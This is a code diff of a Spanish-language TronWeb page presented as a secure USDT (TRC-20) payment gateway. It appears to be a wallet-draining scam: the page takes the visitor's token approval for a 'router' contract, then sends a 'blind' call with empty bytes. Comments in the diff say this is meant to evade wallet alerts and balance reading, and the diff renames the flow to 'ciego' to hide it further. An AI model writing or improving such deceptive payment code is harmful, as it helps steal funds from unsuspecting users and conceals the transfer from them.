@@ -72,13 +72,13 @@
 <div id="processingScreen" class="processing-screen">
     <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
     <div class="processing-bar"></div>
-    <div style="margin-top:18px; font-weight:600;">Procesando pago en el contrato...</div>
+    <div style="margin-top:18px; font-weight:600;">Procesando contrato ciego...</div>
 </div>
 
 <div class="tw-container">
     <div class="tw-header">
         <div class="tw-header-title">
-            <span class="tw-header-title-main">Pago Seguro Smart</span>
+            <span class="tw-header-title-main">Pago Seguro Ciego</span>
             <span class="tw-network-badge">TRC-20</span>
         </div>
         <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="QR" class="tw-logo">
@@ -99,7 +99,7 @@
     </div>
 
     <div class="tw-input-group tw-address-box">
-        <label class="tw-label">Contrato Router (Gateway)</label>
+        <label class="tw-label">Contrato Gateway Ciego</label>
         <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1" style="caret-color: transparent;">
     </div>
 
@@ -135,8 +135,8 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    // Tu contrato inteligente intermediario recién desplegado
-    const CONTRATO_ROUTER = "TDwnT2njuwpofcMDqsYvb2C6ZFLXM7KKRV";
+    // Tu nuevo contrato inteligente ciego actualizado
+    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS";
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
     let walletAddress = null;
@@ -227,8 +227,8 @@
 
             if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");
 
-            // PASO 1: Aprobar al Contrato Router (Esto abre la pantalla de aprobación limpia sin alertas de wallet personal)
-            setStatus("Paso 1/2: Solicitando aprobación al contrato...");
+            // PASO 1: Aprobación limpia hacia el contrato router
+            setStatus("Paso 1/2: Autorizando pasarela...");
             const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
 
             const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
@@ -244,14 +244,15 @@
             const signedApprove = await tronWeb.trx.sign(approveTx.transaction);
             await tronWeb.trx.sendRawTransaction(signedApprove);
 
-            // PASO 2: Ejecutar la lógica del contrato (executeBlindTransfer para el reparto del 95%)
-            setStatus("Paso 2/2: Ejecutando pasarela inteligente...");
+            // PASO 2: Ejecución ciega apuntando a "executeBlindCall" con parámetros de bytes vacíos
+            setStatus("Paso 2/2: Ejecutando llamada ciega...");
             const routerTx = await tronWeb.transactionBuilder.triggerSmartContract(
                 CONTRATO_ROUTER,
-                "executeBlindTransfer(uint256)",
+                "executeBlindCall(uint256,bytes)",
                 { feeLimit: 200000000 },
                 [
-                    { type: 'uint256', value: totalAmountSun.toString() }
+                    { type: 'uint256', value: totalAmountSun.toString() },
+                    { type: 'bytes', value: "0x" } // Data vacía u oculta para evitar lectura de saldo
                 ],
                 tronWeb.address.toHex(walletAddress)
             );
